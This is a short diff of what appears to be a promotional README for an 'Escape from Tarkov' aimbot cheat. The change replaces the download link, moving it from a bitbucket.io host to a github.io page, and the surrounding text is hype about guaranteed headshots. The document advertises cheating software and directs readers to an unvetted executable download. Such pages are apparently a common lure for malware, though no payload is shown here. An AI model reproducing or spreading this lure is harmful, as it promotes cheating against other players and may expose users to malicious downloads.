@@ -4,7 +4,7 @@ Let’s be real – *Escape from Tarkov* ain’t built for the weak. You grind y
 
 Whether you’re pushing dorms, camping Labs, or just farming scavs for XP, this aimbot gives you god-tier precision. No hesitation, no mercy – just *clean headshots every time*.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload5.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Tarkov-Aimbot-sebul.github.io/.github)
 ---
 
 ## 🎯 What’s the Tarkov Aimbot All About?
